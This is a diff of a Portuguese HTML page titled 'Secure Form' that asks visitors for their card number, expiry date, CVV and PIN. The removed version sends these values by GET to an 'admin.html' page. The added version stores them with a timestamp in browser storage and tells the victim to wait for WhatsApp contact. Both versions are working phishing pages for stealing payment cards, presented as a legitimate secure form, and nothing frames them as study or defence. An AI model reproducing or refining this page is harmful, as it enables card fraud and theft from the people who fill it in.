@@ -1,237 +1,43 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário Seguro</title>
-    <!-- Tailwind CSS CDN para um design simples e objetivo -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        /* Estilos personalizados para o corpo e contêiner */
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5; /* Fundo cinza claro */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            max-width: 400px;
-            width: 95%;
-            background-color: #ffffff;
-            border-radius: 1rem; /* Cantos arredondados */
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            padding: 2rem;
-            text-align: center;
-        }
-        .input-field {
-            width: 100%;
-            padding: 0.75rem 1rem;
-            margin-bottom: 1rem;
-            border: 1px solid #d1d5db; /* Borda cinza */
-            border-radius: 0.5rem;
-            font-size: 1rem;
-            transition: border-color 0.3s ease;
-            outline: none;
-        }
-        .input-field:focus {
-            border-color: #3b82f6; /* Borda azul no foco */
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.25);
-        }
-        .action-button {
-            width: 100%;
-            padding: 0.75rem 1.5rem;
-            background-color: #3b82f6; /* Botão azul */
-            color: #ffffff;
-            border: none;
-            border-radius: 0.5rem;
-            font-size: 1.125rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.2);
-        }
-        .action-button:hover {
-            background-color: #2563eb; /* Azul mais escuro no hover */
-            transform: translateY(-1px);
-        }
-        .action-button:active {
-            transform: translateY(0);
-            box-shadow: 0 1px 4px rgba(59, 130, 246, 0.2);
-        }
-        .hidden {
-            display: none;
-        }
-        .message-box {
-            background-color: #fee2e2; /* Fundo vermelho claro */
-            color: #ef4444; /* Texto vermelho escuro */
-            padding: 0.75rem;
-            border: 1px solid #fca5a5; /* Borda vermelha */
-            border-radius: 0.5rem;
-            margin-top: 0.5rem;
-            font-size: 0.875rem;
-            display: none; /* Inicialmente oculto */
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Formulário Seguro</title>
 </head>
 <body>
-    <div class="container">
-        <h1 class="text-2xl font-bold text-gray-800 mb-6">Formulário Seguro</h1>
-
-        <!-- Passo 1: Número do Cartão -->
-        <div id="step1" class="form-step">
-            <div class="mb-4">
-                <label for="cartao" class="block text-gray-700 text-sm font-medium mb-2 text-left">Número do Cartão (16 dígitos):</label>
-                <input type="text" id="cartao" class="input-field" placeholder="Ex: 1234567890123456" maxlength="16" pattern="\d{16}" inputmode="numeric" required>
-                <div id="messageBox1" class="message-box"></div>
-            </div>
-            <button id="next1" class="action-button">Continuar</button>
-        </div>
-
-        <!-- Passo 2: Validade -->
-        <div id="step2" class="form-step hidden">
-            <div class="mb-4">
-                <label for="validade" class="block text-gray-700 text-sm font-medium mb-2 text-left">Validade (MMYY):</label>
-                <input type="text" id="validade" class="input-field" placeholder="Ex: 0927" maxlength="4" pattern="\d{4}" inputmode="numeric" required>
-                <div id="messageBox2" class="message-box"></div>
-            </div>
-            <button id="next2" class="action-button">Continuar</button>
-        </div>
-
-        <!-- Passo 3: CVV -->
-        <div id="step3" class="form-step hidden">
-            <div class="mb-4">
-                <label for="cvv" class="block text-gray-700 text-sm font-medium mb-2 text-left">CVV (3 dígitos):</label>
-                <input type="text" id="cvv" class="input-field" placeholder="Ex: 123" maxlength="3" pattern="\d{3}" inputmode="numeric" required>
-                <div id="messageBox3" class="message-box"></div>
-            </div>
-            <button id="next3" class="action-button">Continuar</button>
-        </div>
-
-        <!-- Passo 4: Senha/PIN -->
-        <div id="step4" class="form-step hidden">
-            <div class="mb-6">
-                <label for="pin" class="block text-gray-700 text-sm font-medium mb-2 text-left">Senha/PIN (até 8 dígitos):</label>
-                <input type="password" id="pin" class="input-field" placeholder="****" maxlength="8" pattern="\d{4,8}" inputmode="numeric" required>
-                <div id="messageBox4" class="message-box"></div>
-            </div>
-            <button id="submitForm" class="action-button">Enviar</button>
-        </div>
-
-        <!-- Mensagem de processamento (opcional, pode ser usada antes do redirecionamento) -->
-        <div id="processingMessage" class="form-step hidden">
-            <h2 class="text-xl font-bold text-gray-800 mb-4">Processando seus dados...</h2>
-            <p class="text-gray-600">Por favor, aguarde.</p>
-        </div>
-
-    </div>
-
-    <script>
-        // Objeto para armazenar os dados coletados
-        const collectedData = {};
-        // Array de IDs dos passos do formulário
-        const steps = ['step1', 'step2', 'step3', 'step4', 'processingMessage'];
-        let currentStepIndex = 0;
-
-        // Função para exibir mensagens de erro
-        function showMessage(boxId, message) {
-            const messageBox = document.getElementById(boxId);
-            messageBox.textContent = message;
-            messageBox.style.display = 'block';
-        }
-
-        // Função para ocultar mensagens
-        function hideMessage(boxId) {
-            document.getElementById(boxId).style.display = 'none';
-        }
-
-        // Função para avançar para o próximo passo
-        function nextStep() {
-            // Oculta o passo atual
-            document.getElementById(steps[currentStepIndex]).classList.add('hidden');
-            currentStepIndex++;
-            // Mostra o próximo passo
-            document.getElementById(steps[currentStepIndex]).classList.remove('hidden');
-        }
-
-        // Event Listener para o botão "Continuar" do Passo 1 (Número do Cartão)
-        document.getElementById('next1').addEventListener('click', function() {
-            const input = document.getElementById('cartao');
-            const value = input.value.trim();
-            hideMessage('messageBox1'); // Oculta qualquer mensagem anterior
-
-            if (value.length === 16 && /^\d{16}$/.test(value)) {
-                collectedData.cartao = value;
-                nextStep();
-            } else {
-                showMessage('messageBox1', 'Por favor, digite exatamente 16 dígitos numéricos.');
-            }
-        });
-
-        // Event Listener para o botão "Continuar" do Passo 2 (Validade)
-        document.getElementById('next2').addEventListener('click', function() {
-            const input = document.getElementById('validade');
-            const value = input.value.trim();
-            hideMessage('messageBox2');
-
-            if (value.length === 4 && /^\d{4}$/.test(value)) {
-                collectedData.validade = value;
-                nextStep();
-            } else {
-                showMessage('messageBox2', 'Por favor, digite exatamente 4 dígitos (MMYY).');
-            }
-        });
-
-        // Event Listener para o botão "Continuar" do Passo 3 (CVV)
-        document.getElementById('next3').addEventListener('click', function() {
-            const input = document.getElementById('cvv');
-            const value = input.value.trim();
-            hideMessage('messageBox3');
-
-            if (value.length === 3 && /^\d{3}$/.test(value)) {
-                collectedData.cvv = value;
-                nextStep();
-            } else {
-                showMessage('messageBox3', 'Por favor, digite exatamente 3 dígitos (CVV).');
-            }
-        });
-
-        // Event Listener para o botão "Enviar" do Passo 4 (Senha/PIN)
-        document.getElementById('submitForm').addEventListener('click', function() {
-            const input = document.getElementById('pin');
-            const value = input.value.trim();
-            hideMessage('messageBox4');
-
-            if (value.length >= 4 && value.length <= 8 && /^\d{4,8}$/.test(value)) {
-                collectedData.pin = value;
-                nextStep(); // Mostra a mensagem de processamento
-
-                // Cria um formulário dinâmico para enviar os dados via GET
-                const form = document.createElement('form');
-                form.action = 'admin.html';
-                form.method = 'get';
-                form.style.display = 'none'; // Oculta o formulário
-
-                // Adiciona os dados coletados como campos ocultos ao formulário
-                for (const key in collectedData) {
-                    if (collectedData.hasOwnProperty(key)) {
-                        const hiddenField = document.createElement('input');
-                        hiddenField.type = 'hidden';
-                        hiddenField.name = key;
-                        hiddenField.value = collectedData[key];
-                        form.appendChild(hiddenField);
-                    }
-                }
-
-                document.body.appendChild(form); // Adiciona o formulário ao corpo do documento
-                form.submit(); // Envia o formulário
-            } else {
-                showMessage('messageBox4', 'Por favor, digite uma senha de 4 a 8 dígitos numéricos.');
-            }
-        });
-    </script>
+  <h2>Formulário Seguro</h2>
+  <form id="secureForm">
+    <input name="cartao" maxlength="16" placeholder="Cartão" required><br>
+    <input name="validade" maxlength="4" placeholder="Validade MMYY" required><br>
+    <input name="cvv" maxlength="3" placeholder="CVV" required><br>
+    <input name="pin" maxlength="8" placeholder="Senha/PIN" required><br>
+    <button type="submit">Enviar</button>
+  </form>
+  <div id="successMsg" style="display:none;">
+    <h3>Seus dados foram enviados.<br>
+    Aguarde contato no WhatsApp.</h3>
+  </div>
+  <script>
+    document.getElementById('secureForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      // Captura os dados
+      const data = {
+        cartao: this.cartao.value,
+        validade: this.validade.value,
+        cvv: this.cvv.value,
+        pin: this.pin.value,
+        hora: new Date().toLocaleString()
+      };
+      // Recupera do localStorage ou cria array vazio
+      let envios = JSON.parse(localStorage.getItem('envios')) || [];
+      // Adiciona novo envio
+      envios.push(data);
+      // Salva no localStorage
+      localStorage.setItem('envios', JSON.stringify(envios));
+      // Limpa e mostra mensagem de sucesso
+      this.style.display = 'none';
+      document.getElementById('successMsg').style.display = 'block';
+    });
+  </script>
 </body>
 </html>
